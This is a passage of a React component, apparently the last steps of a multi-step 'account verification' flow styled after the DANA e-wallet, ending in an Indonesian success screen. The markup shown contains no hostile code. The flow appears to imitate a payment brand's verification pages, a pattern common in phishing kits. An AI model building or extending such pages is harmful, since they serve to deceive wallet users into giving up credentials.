                  <span className="font-bold text-gray-800">Verifikasi</span>.
                </p>
              </div>
            </div>

            {errorMessage && (
              <p className="mt-4 rounded-lg bg-red-50 px-4 py-2.5 text-center text-xs text-red-600">{errorMessage}</p>
            )}
          </div>
        </div>
      )}

      {/* Step 4 (if used elsewhere) */}
      {step === 4 && (
        <div className="mx-auto flex min-h-screen w-full max-w-md flex-col items-center justify-center bg-white px-6">
          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-[#108EE9]/10">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <circle cx="12" cy="12" r="10" stroke="#108EE9" strokeWidth="2" />
              <path d="M8 12l3 3 5-6" stroke="#108EE9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          <h2 className="mt-6 text-xl font-bold text-gray-900">Berhasil!</h2>
          <p className="mt-2 text-center text-sm text-gray-500">Verifikasi akun DANA kamu telah selesai.</p>
          <p className="mt-1 text-center text-xs text-gray-400">Terima kasih.</p>
        </div>
      )}
      </div>
    </>
  );
}

